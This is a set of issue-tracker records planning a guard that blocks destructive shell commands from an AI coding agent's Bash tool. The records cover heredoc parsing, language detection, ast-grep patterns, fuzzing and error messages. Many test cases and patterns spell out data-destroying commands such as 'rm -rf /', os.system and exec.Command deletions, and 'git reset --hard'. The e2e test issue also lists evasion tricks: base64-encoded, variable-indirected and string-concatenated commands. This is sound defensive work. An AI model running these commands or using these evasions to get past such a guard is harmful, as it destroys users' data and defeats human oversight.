(git_safety_guard-jfj)\n- Implement heredoc extraction (git_safety_guard-y4j)\n\n## Success Criteria\n- Correctly identify language in 95%+ of test cases\n- No panics on malformed input\n- Clear Language::Unknown for genuinely unknown cases","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:31:49.058497233-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:31:49.058497233-05:00","dependencies":[{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:31:58.308674617-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-du4","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:31:58.326331058-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e2eh","title":"Extend e2e_test.sh with heredoc test cases","description":"# E2E Test Script Extension for Heredocs\n\n## Objective\n\nExtend the existing `scripts/e2e_test.sh` with comprehensive heredoc test cases.\n\n## Test Categories to Add\n\n### 1. Heredoc Detection Tests\n\n```bash\n# Should BLOCK - Python heredoc with os.system\ntest_blocked 'python3 \u003c\u003c EOF\nimport os\nos.system(\"rm -rf /tmp/test\")\nEOF' \"Python heredoc with os.system\"\n\n# Should BLOCK - Bash heredoc with rm\ntest_blocked 'bash \u003c\u003c EOF\nrm -rf /important\nEOF' \"Bash heredoc with rm -rf\"\n\n# Should BLOCK - Node inline script\ntest_blocked 'node -e \"require('child_process').execSync('rm -rf /')\"' \"Node inline with execSync\"\n```\n\n### 2. Heredoc Variant Tests\n\n```bash\n# Test all heredoc syntaxes\ntest_blocked 'cat \u003c\u003cEOF | python3\nimport os; os.system(\"rm -rf /\")\nEOF' \"Piped heredoc\"\n\ntest_blocked 'python3 \u003c\u003c-EOF\n    import os\n    os.system(\"rm -rf /\")\nEOF' \"Indented heredoc (\u003c\u003c-)\"\n\ntest_blocked 'python3 \u003c\u003c'EOF'\nimport os\nos.system(\"rm -rf /\")\nEOF' \"Quoted delimiter heredoc\"\n```\n\n### 3. Language Coverage Tests\n\n```bash\n# Python\ntest_blocked 'python3 -c \"import shutil; shutil.rmtree('/tmp')\"'\n\n# Ruby  \ntest_blocked 'ruby -e \"FileUtils.rm_rf('/tmp')\"'\n\n# Perl\ntest_blocked 'perl -e \"system('rm -rf /')\"'\n\n# JavaScript\ntest_blocked 'node -e \"require('fs').rmdirSync('/', {recursive:true})\"'\n```\n\n### 4. False Positive Tests\n\n```bash\n# Should ALLOW - Documentation with dangerous strings\ntest_allowed 'bd create --description=\"This pattern blocks rm -rf\"' \"Doc with rm -rf\"\ntest_allowed 'git commit -m \"Fix git reset --hard detection\"' \"Commit msg\"\ntest_allowed 'grep \"rm -rf\" src/main.rs' \"Grep for pattern\"\ntest_allowed 'echo \"example: git push --force\"' \"Echo example\"\n```\n\n### 5. Bypass Attempt Tests\n\n```bash\n# Variable indirection\ntest_blocked 'bash -c \"CMD=rm; \\$CMD -rf /\"' \"Variable indirection\"\n\n# Base64 encoding\ntest_blocked 'bash -c \"echo cm0gLXJmIC8K | base64 -d | bash\"' \"Base64 bypass\"\n\n# String concatenation  \ntest_blocked 'python3 -c \"exec('r'+'m'+' -rf /')\"' \"String concat\"\n```\n\n### 6. Edge Cases\n\n```bash\n# Empty heredoc\ntest_allowed 'cat \u003c\u003c EOF\nEOF' \"Empty heredoc\"\n\n# Safe heredoc content\ntest_allowed 'python3 \u003c\u003c EOF\nprint(\"hello world\")\nEOF' \"Safe Python heredoc\"\n\n# Nested quotes\ntest_blocked 'bash -c \"bash -c 'rm -rf /'\"' \"Nested shells\"\n```\n\n## Logging Enhancement\n\nAdd verbose mode:\n```bash\n#!/bin/bash\nset -euo pipefail\n\nVERBOSE=${VERBOSE:-0}\nLOG_FILE=\"e2e_test_$(date +%Y%m%d_%H%M%S).log\"\n\nlog() {\n    echo \"[$(date '+%H:%M:%S')] $*\" | tee -a \"$LOG_FILE\"\n}\n\ntest_blocked() {\n    local cmd=\"$1\"\n    local desc=\"$2\"\n    log \"TEST: $desc\"\n    log \"  CMD: ${cmd:0:80}...\"\n    \n    if echo \"{\\\"tool_name\\\":\\\"Bash\\\",\\\"tool_input\\\":{\\\"command\\\":\\\"$cmd\\\"}}\" | ./target/release/dcg 2\u003e/dev/null; then\n        log \"  FAIL: Expected block, got allow\"\n        return 1\n    else\n        log \"  PASS: Correctly blocked\"\n        return 0\n    fi\n}\n```\n\n## Output Summary\n\nAt end of test run:\n```\n=====================================\nE2E Test Summary\n=====================================\nTotal tests: 150\nPassed: 148\nFailed: 2\nSkipped: 0\n\nFailed tests:\n  - Python heredoc with subprocess (line 234)\n  - Node inline with dynamic require (line 456)\n\nLog file: e2e_test_20260107_193045.log\n=====================================\n```","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.841249285-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e2eh","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:08:55.268336107-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-e7m","title":"Integrate heredoc detection into main check pipeline","description":"## Objective\n\nIntegrate all heredoc detection components into the main dcg check pipeline, creating a seamless flow from command input to block/allow decision.\n\n## Pipeline Architecture\n\n```\nJSON Input → Parse → Quick Reject → Normalize →\n  → Heredoc Detection → [if heredoc found] →\n    → Extract Content → Detect Language → Parse with ast-grep →\n    → Apply Language Patterns → Block Decision\n  → [no heredoc] → Existing Pattern Matching → Block Decision\n```\n\n## Integration Points\n\n### 1. Entry Point Hook\n\nModify main.rs check flow to:\n1. After quick reject passes, check for heredoc indicators\n2. If heredoc found, branch to heredoc analysis path\n3. If no heredoc, continue with existing pattern matching\n4. Merge results from both paths\n\n### 2. Heredoc Detection Integration\n\nInsert heredoc detection before main pattern matching:\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n\n    // NEW: Heredoc detection\n    if let Some(heredoc_result) = check_heredoc(cmd) {\n        if heredoc_result.blocked {\n            return heredoc_result;\n        }\n    }\n\n    // Existing pattern matching\n    REGISTRY.check_command(cmd, \u0026enabled_packs)\n}\n```\n\n### 3. Performance Budget\n\nTotal additional latency budget: 50ms worst case\n- Heredoc detection regex: \u003c2ms\n- Content extraction: \u003c1ms\n- Language detection: \u003c1ms\n- ast-grep invocation: \u003c40ms (external process)\n- Pattern matching: \u003c5ms\n\nIf ast-grep is too slow, fall back to regex patterns for the heredoc body.\n\n### 4. Feature Flag\n\nAdd heredoc scanning to pack system:\n- New pack: \"heredoc\" or integrate into \"core\"\n- Can be enabled/disabled via configuration\n- Default: enabled for new installations\n\n### 5. Error Handling\n\nGraceful degradation:\n- ast-grep not installed → warn, fall back to regex\n- ast-grep timeout → allow command, log warning\n- Parse error → allow command, log for debugging\n- Unknown language → use generic patterns or allow\n\n## Configuration\n\nNew config options:\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nfallback_on_error = true\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n```\n\n## Testing Integration\n\nIntegration tests should cover:\n- Normal commands (no heredoc) still work fast\n- Heredoc commands get analyzed\n- Pattern matches in heredocs block correctly\n- Safe heredocs pass through\n- Error paths handle gracefully\n\n## Dependencies\n\n- Heredoc syntax detection\n- Content extraction\n- Language detection\n- ast-grep invocation layer\n- All language patterns\n","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:38:07.195631302-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:39:16.10840837-05:00","dependencies":[{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-49s","type":"blocks","created_at":"2026-01-07T18:39:24.471336629-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T18:39:24.491188224-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:39:24.509697502-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:39:24.528749381-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T18:39:31.682050985-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-beq","type":"blocks","created_at":"2026-01-07T18:39:31.702476952-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-uau","type":"blocks","created_at":"2026-01-07T18:39:31.720255513-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:39:31.739706774-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-26f","type":"blocks","created_at":"2026-01-07T18:39:31.75902245-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-mvh","type":"blocks","created_at":"2026-01-07T18:39:31.776348198-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-2d4","type":"blocks","created_at":"2026-01-07T18:39:31.795580477-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-e7m","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:08:41.394423996-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-erux","title":"Design user-friendly error messages for heredoc blocks","description":"# User-Friendly Error Messages for Heredoc Blocking\n\n## Objective\n\nWhen a heredoc command is blocked, provide clear, actionable error messages that help users understand WHY it was blocked and HOW to proceed.\n\n## Current Error Format (for reference)\n\n```\n╔══════════════════════════════════════════════════════════════╗\n║  ⚠️  BLOCKED: Destructive Command Detected                   ║\n╠══════════════════════════════════════════════════════════════╣\n║  Command: git reset --hard HEAD~5                            ║\n║  Reason:  Hard reset can permanently lose commits            ║\n║  Pack:    core.git                                           ║\n╚══════════════════════════════════════════════════════════════╝\n```\n\n## Enhanced Error Format for Heredocs\n\n```\n╔══════════════════════════════════════════════════════════════╗\n║  ⚠️  BLOCKED: Destructive Pattern in Heredoc                 ║\n╠══════════════════════════════════════════════════════════════╣\n║  Language: Python                                            ║\n║  Pattern:  os.system($CMD)                                   ║\n║  Matched:  os.system(\"rm -rf /tmp/data\")                    ║\n║  Line:     3 of heredoc                                      ║\n║  Reason:   Shell command execution via os.system             ║\n║  Pack:     heredoc.python                                    ║\n╠══════════════════════════════════════════════════════════════╣\n║  Context:                                                    ║\n║    1│ import os                                              ║\n║    2│ path = \"/tmp/data\"                                    ║\n║  ▶ 3│ os.system(\"rm -rf /tmp/data\")  ← BLOCKED             ║\n║    4│ print(\"done\")                                         ║\n╠══════════════════════════════════════════════════════════════╣\n║  💡 Suggestions:                                             ║\n║  • Use pathlib.Path.unlink() for single file deletion       ║\n║  • Use shutil.rmtree() with explicit path validation        ║\n║  • If intentional, use dcg allow --reason \"...\"             ║\n╚══════════════════════════════════════════════════════════════╝\n```\n\n## Error Message Components\n\n### 1. Header\n- Clear indication this is a BLOCK, not just a warning\n- Specify it's a heredoc/inline script detection\n\n### 2. Detection Details\n- Language detected\n- Pattern name that matched\n- Actual matched text (truncated if long)\n- Line number within heredoc\n- Human-readable reason\n\n### 3. Context Window\n- Show 2-3 lines before and after the match\n- Highlight the offending line with arrow\n- Syntax highlighting if terminal supports it\n\n### 4. Suggestions\n- Language-specific safe alternatives\n- How to override if intentional\n- Link to documentation\n\n## JSON Output Format\n\nFor Claude Code hook protocol:\n\n```json\n{\n  \"hookSpecificOutput\": {\n    \"permissionDecision\": \"deny\",\n    \"reason\": \"Heredoc contains destructive pattern: os.system with shell command\",\n    \"details\": {\n      \"detection_type\": \"heredoc\",\n      \"language\": \"python\",\n      \"pattern\": \"os.system($CMD)\",\n      \"matched_text\": \"os.system(\\\"rm -rf /tmp/data\\\")\",\n      \"line_in_heredoc\": 3,\n      \"pack\": \"heredoc.python\",\n      \"suggestions\": [\n        \"Use pathlib.Path.unlink() for single file deletion\",\n        \"Use shutil.rmtree() with explicit path validation\"\n      ]\n    }\n  }\n}\n```\n\n## Suggestions Database\n\nMaintain per-pattern suggestions:\n\n```rust\nstatic PATTERN_SUGGESTIONS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"os.system\", \u0026[\n        \"Use subprocess.run() with shell=False\",\n        \"Use pathlib for file operations\",\n    ]),\n    (\"shutil.rmtree\", \u0026[\n        \"Validate path is within expected directory\",\n        \"Use explicit allowlist of deletable paths\",\n    ]),\n    (\"exec\", \u0026[\n        \"Use importlib for dynamic imports\",\n        \"Consider ast.literal_eval for safe evaluation\",\n    ]),\n];\n```\n\n## Test Cases\n\n- Verify all pattern types have suggestions\n- Verify context window is correctly extracted\n- Verify line numbers are accurate\n- Verify JSON output is valid\n- Verify color output is readable\n- Verify truncation for long matches","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:45:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:45:00-05:00","dependencies":[{"issue_id":"git_safety_guard-erux","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:30:59.175383831-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-f4f","title":"Implement ast-grep-core pattern matching layer","description":"# ast-grep-core Pattern Matching Layer\n\n## Objective\n\nIntegrate ast-grep-core as a Rust library for structural pattern matching in heredoc content.\n\n## Architecture Decision\n\n**EMBED ast-grep-core directly** - NOT shell out to CLI\n\nRationale:\n- Sub-millisecond latency (no process spawn)\n- Single binary distribution (no external dependencies)\n- Better error handling\n- Type-safe Rust API\n\n## Dependencies to Add\n\n```toml\n[dependencies]\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\n    \"bash\",\n    \"python\", \n    \"javascript\",\n    \"typescript\",\n    \"ruby\"\n    # Note: Perl may not be available\n] }\n```\n\n## API Design\n\n```rust\n/// Pattern matcher using ast-grep-core\npub struct AstMatcher {\n    patterns: HashMap\u003cLanguage, Vec\u003cCompiledPattern\u003e\u003e,\n}\n\nimpl AstMatcher {\n    /// Create matcher with default destructive patterns\n    pub fn new() -\u003e Self;\n    \n    /// Load patterns from config\n    pub fn from_config(config: \u0026PatternConfig) -\u003e Result\u003cSelf\u003e;\n    \n    /// Match patterns against code\n    pub fn find_matches(\n        \u0026self,\n        code: \u0026str,\n        language: Language,\n    ) -\u003e Vec\u003cPatternMatch\u003e;\n}\n\n/// Result of pattern matching\npub struct PatternMatch {\n    pub pattern_name: String,\n    pub reason: String,\n    pub matched_text: String,\n    pub line_number: usize,\n    pub severity: Severity,\n}\n\npub enum Severity {\n    Block,      // Always block\n    Warn,       // Log warning but allow\n    Info,       // Informational only\n}\n```\n\n## Pattern Definition Format\n\nPatterns use ast-grep's intuitive syntax:\n\n```rust\nstatic PYTHON_PATTERNS: \u0026[(\u0026str, \u0026str, \u0026str)] = \u0026[\n    // (name, pattern, reason)\n    (\"os_system\", \"os.system($CMD)\", \"Direct shell execution via os.system\"),\n    (\"subprocess_shell\", \"subprocess.run($$$ARGS, shell=True)\", \"Shell execution via subprocess\"),\n    (\"shutil_rmtree\", \"shutil.rmtree($PATH)\", \"Recursive directory deletion\"),\n    (\"exec_call\", \"exec($CODE)\", \"Dynamic code execution\"),\n    (\"eval_call\", \"eval($CODE)\", \"Dynamic code evaluation\"),\n];\n```\n\n## Error Handling\n\n```rust\npub enum MatchError {\n    UnsupportedLanguage(Language),\n    ParseError { language: Language, error: String },\n    PatternCompileError { pattern: String, error: String },\n    Timeout { elapsed_ms: u64 },\n}\n\n/// Graceful degradation on errors\nimpl AstMatcher {\n    pub fn find_matches_with_fallback(\n        \u0026self,\n        code: \u0026str,\n        language: Language,\n    ) -\u003e Result\u003cVec\u003cPatternMatch\u003e, MatchError\u003e {\n        match self.find_matches_internal(code, language) {\n            Ok(matches) =\u003e Ok(matches),\n            Err(MatchError::Timeout { .. }) =\u003e {\n                tracing::warn!(\"AST matching timed out, allowing command\");\n                Ok(vec![])  // Fail-open\n            }\n            Err(e) =\u003e Err(e),\n        }\n    }\n}\n```\n\n## Performance\n\nTarget latency:\n- Pattern compilation: One-time at startup (\u003c100ms for all languages)\n- Code parsing: \u003c2ms for typical heredoc (100 lines)\n- Pattern matching: \u003c1ms per pattern set\n- Total: \u003c5ms for full analysis\n\n## Test Cases\n\n```rust\n#[test]\nfn test_python_os_system_detection() {\n    let matcher = AstMatcher::new();\n    let code = \"import os\\nos.system('rm -rf /')\";\n    let matches = matcher.find_matches(code, Language::Python);\n    \n    assert_eq!(matches.len(), 1);\n    assert_eq!(matches[0].pattern_name, \"os_system\");\n}\n\n#[test]\nfn test_safe_python_code() {\n    let matcher = AstMatcher::new();\n    let code = \"print('hello world')\";\n    let matches = matcher.find_matches(code, Language::Python);\n    \n    assert!(matches.is_empty());\n}\n```","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:32:24.313325332-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:29:18.751557748-05:00","dependencies":[{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:32:32.909572665-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:32:32.929896409-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fpim","title":"Implement false positive reduction for string arguments","description":"# False Positive Reduction Implementation\n\n## Problem\n\nCurrent regex patterns match dangerous strings even in safe contexts:\n- `bd create --description=\"This blocks rm -rf\"` → BLOCKED (wrong!)\n- `git commit -m \"Fix rm -rf pattern\"` → BLOCKED (wrong!)\n- `grep \"rm -rf\" patterns.txt` → BLOCKED (wrong!)\n\n## Solution\n\nParse command structure to identify execution context before applying destructive patterns.\n\n## Implementation\n\n### 1. Safe Command Registry\n\n```rust\nstatic SAFE_STRING_ARG_COMMANDS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"bd\", \u0026[\"--description\", \"--title\", \"-d\", \"-t\"]),\n    (\"git\", \u0026[\"commit -m\", \"tag -m\", \"notes add -m\"]),\n    (\"grep\", \u0026[\"-e\", \"--regexp\"]),\n    (\"rg\", \u0026[\"-e\", \"--regexp\"]),\n    (\"echo\", \u0026[]),  // all args are strings\n    (\"printf\", \u0026[]),\n];\n```\n\n### 2. Execution Context Detection\n\n```rust\nenum ExecutionContext {\n    Direct,           // Command itself is executed\n    StringArgument,   // Inside quoted string argument to safe command\n    HeredocBody,      // Inside heredoc (needs Tier 2 analysis)\n    PipeTarget,       // Right side of pipe (executed)\n    CommandSubst,     // Inside $() or backticks (executed)\n}\n\nfn detect_execution_context(cmd: \u0026str, position: usize) -\u003e ExecutionContext;\n```\n\n### 3. Integration Point\n\nModify main check flow:\n\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n    \n    // NEW: Check if dangerous patterns are in safe context\n    if is_safe_string_context(cmd) {\n        return CheckResult::allowed();\n    }\n    \n    // Continue with heredoc detection and pattern matching...\n}\n```\n\n## Test Cases\n\n### Must ALLOW (false positive prevention)\n- `bd create --description=\"Pattern blocks rm -rf commands\"`\n- `git commit -m \"Fix git reset --hard detection\"`\n- `grep \"rm -rf\" src/patterns.rs`\n- `echo \"example: git push --force\"`\n- `rg -e \"DROP TABLE\" --type sql`\n\n### Must BLOCK (true positives preserved)\n- `rm -rf /tmp/*`\n- `git reset --hard HEAD~5`\n- `bash -c \"rm -rf /\"`\n- `echo \"hi\" | bash -c \"rm -rf /\"`\n\n## Performance\n\n- \u003c 100 microseconds additional overhead\n- Simple string prefix matching for command detection\n- No regex needed for this layer\n\n## Dependencies\n\n- Depends on: False positive design (2cu)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T19:28:32.226122941-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:22.808621071-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x.1","type":"blocks","created_at":"2026-01-07T20:03:42.899745326-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:03:47.932828938-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:03:52.966413813-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fuzz","title":"Implement fuzzing and property-based testing for heredoc parser","description":"# Fuzzing and Property-Based Testing\n\n## Objective\n\nEnsure heredoc detection is robust against malformed, malicious, or unexpected input through automated testing.\n\n## Fuzzing with cargo-fuzz\n\n### Setup\n\n```toml\n# Cargo.toml\n[dev-dependencies]\nlibfuzzer-sys = \"0.4\"\narbitrary = { version = \"1\", features = [\"derive\"] }\n```\n\n### Fuzz Targets\n\n```rust\n// fuzz/fuzz_targets/heredoc_extraction.rs\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\nuse dcg::heredoc::extract_heredoc;\n\nfuzz_target!(|data: \u0026str| {\n    // Should never panic\n    let _ = extract_heredoc(data);\n});\n\n// fuzz/fuzz_targets/language_detection.rs\nfuzz_target!(|data: \u0026str| {\n    let _ = detect_language(data);\n});\n\n// fuzz/fuzz_targets/tier1_regex.rs\nfuzz_target!(|data: \u0026str| {\n    let _ = might_contain_heredoc(data);\n});\n\n// fuzz/fuzz_targets/full_pipeline.rs\nfuzz_target!(|data: \u0026str| {\n    // Full check should never panic\n    let _ = check_command(data);\n});\n```\n\n### Running Fuzzing\n\n```bash\n# Install cargo-fuzz\ncargo install cargo-fuzz\n\n# Run fuzz target\ncargo +nightly fuzz run heredoc_extraction -- -max_len=100000\n\n# Run for specific duration\ncargo +nightly fuzz run full_pipeline -- -max_total_time=3600\n```\n\n## Property-Based Testing with proptest\n\n```toml\n[dev-dependencies]\nproptest = \"1.4\"\n```\n\n```rust\nuse proptest::prelude::*;\n\nproptest! {\n    #[test]\n    fn heredoc_extraction_never_panics(s in \".*\") {\n        let _ = extract_heredoc(\u0026s);\n    }\n    \n    #[test]\n    fn valid_heredoc_roundtrips(\n        delimiter in \"[A-Z]+\",\n        content in \"[a-z0-9 \\\\n]*\",\n    ) {\n        let cmd = format!(\"cat \u003c\u003c '{}'\\n{}\\n{}\", delimiter, content, delimiter);\n        let result = extract_heredoc(\u0026cmd);\n        prop_assert!(result.is_ok());\n        prop_assert_eq!(result.unwrap().content.trim(), content.trim());\n    }\n    \n    #[test]\n    fn tier1_is_superset_of_tier2(\n        cmd in \".*\u003c\u003c.*\",\n    ) {\n        // If Tier 2 would process it, Tier 1 must detect it\n        if extract_heredoc(\u0026cmd).is_ok() {\n            prop_assert!(might_contain_heredoc(\u0026cmd));\n        }\n    }\n    \n    #[test]\n    fn safe_commands_never_blocked(\n        safe_cmd in \"(git status|cargo build|ls -la|echo [a-z]+)\"\n    ) {\n        let result = check_command(\u0026safe_cmd);\n        prop_assert!(!result.blocked);\n    }\n}\n```\n\n## Structured Fuzzing\n\n```rust\nuse arbitrary::Arbitrary;\n\n#[derive(Arbitrary, Debug)]\nenum HeredocStyle {\n    Standard,    // \u003c\u003c\n    Indented,    // \u003c\u003c-\n    Quoted,      // \u003c\u003c'DELIM'\n    DoubleQuoted,// \u003c\u003c\"DELIM\"\n}\n\n#[derive(Arbitrary, Debug)]\nstruct FuzzHeredoc {\n    style: HeredocStyle,\n    delimiter: String,\n    content: String,\n    command_prefix: String,\n}\n\nimpl FuzzHeredoc {\n    fn to_command(\u0026self) -\u003e String {\n        let marker = match self.style {\n            HeredocStyle::Standard =\u003e format!(\"\u003c\u003c{}\", self.delimiter),\n            HeredocStyle::Indented =\u003e format!(\"\u003c\u003c-{}\", self.delimiter),\n            HeredocStyle::Quoted =\u003e format!(\"\u003c\u003c'{}'\", self.delimiter),\n            HeredocStyle::DoubleQuoted =\u003e format!(\"\u003c\u003c\\\"{}\\\"\", self.delimiter),\n        };\n        format!(\"{}{}\\n{}\\n{}\", self.command_prefix, marker, self.content, self.delimiter)\n    }\n}\n\nfuzz_target!(|heredoc: FuzzHeredoc| {\n    let cmd = heredoc.to_command();\n    let _ = check_command(\u0026cmd);\n});\n```\n\n## CI Integration\n\n```yaml\n# .github/workflows/fuzz.yml\nname: Fuzz Testing\non:\n  schedule:\n    - cron: '0 0 * * 0'  # Weekly\n  workflow_dispatch:\n\njobs:\n  fuzz:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: dtolnay/rust-toolchain@nightly\n      - run: cargo install cargo-fuzz\n      - run: cargo +nightly fuzz run heredoc_extraction -- -max_total_time=600\n      - run: cargo +nightly fuzz run full_pipeline -- -max_total_time=600\n```\n\n## Success Criteria\n\n- Zero panics after 1M+ iterations\n- All fuzz targets run in CI\n- Coverage of edge cases documented\n- Crash reproduction tests for any found issues","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:46:42.405361011-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T19:46:43.72144523-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-goph","title":"Define Go destructive patterns for heredoc scanning","description":"# Go Destructive Patterns for Heredoc Scanning\n\n## Why Go?\n\nGo is extremely common in DevOps/cloud tooling. Patterns like:\n- `go run script.go` with heredoc input\n- Embedded Go in shell scripts\n- Go template execution\n\n## Pattern Categories\n\n### 1. OS/Exec Patterns\n\n```go\n// Dangerous: Direct command execution\nexec.Command($CMD, $$$ARGS).Run()\nexec.Command($CMD, $$$ARGS).Output()\nexec.Command($CMD, $$$ARGS).CombinedOutput()\nos.exec.Command($CMD)\n\n// Dangerous: Shell execution\nexec.Command(\"sh\", \"-c\", $CMD)\nexec.Command(\"bash\", \"-c\", $CMD)\n```\n\n### 2. File System Patterns\n\n```go\n// Dangerous: Recursive deletion\nos.RemoveAll($PATH)\nfilepath.Walk($PATH, $$$) // if combined with os.Remove\n\n// Dangerous: File operations on system paths\nos.Remove(\"/etc/$$$\")\nos.Remove(\"/var/$$$\")\nos.Chmod($PATH, 0777)\nos.Chown($PATH, 0, 0)\n```\n\n### 3. Unsafe Patterns\n\n```go\n// Dangerous: Unsafe pointer operations\nunsafe.Pointer($X)\n(*[1 \u003c\u003c 30]byte)(unsafe.Pointer($X))\n\n// Dangerous: Reflection for code execution\nreflect.ValueOf($X).Call($$$)\n```\n\n### 4. Network Patterns\n\n```go\n// Suspicious: Download and execute\nhttp.Get($URL) // followed by exec\nioutil.ReadAll($RESP.Body) // followed by exec\n```\n\n## ast-grep Patterns\n\n```yaml\nid: go-exec-command\nlanguage: go\nrule:\n  pattern: exec.Command($CMD, $$$ARGS)\nmessage: \"Direct command execution detected\"\nseverity: error\n\nid: go-remove-all\nlanguage: go  \nrule:\n  pattern: os.RemoveAll($PATH)\nmessage: \"Recursive file deletion detected\"\nseverity: error\n```\n\n## Test Cases\n\n```go\n// Should BLOCK\nos.RemoveAll(\"/tmp/important\")\nexec.Command(\"rm\", \"-rf\", \"/\").Run()\n\n// Should ALLOW\nos.Remove(\"./local_file.txt\")  // Non-recursive, local\nfmt.Println(\"hello\")\n```\n\n## Dependencies\n\n- ast-grep-language must support Go (tree-sitter-go)\n- Pattern library structure design","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-goph","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T19:46:45.603432505-05:00","created_by":"ubuntu"}]}
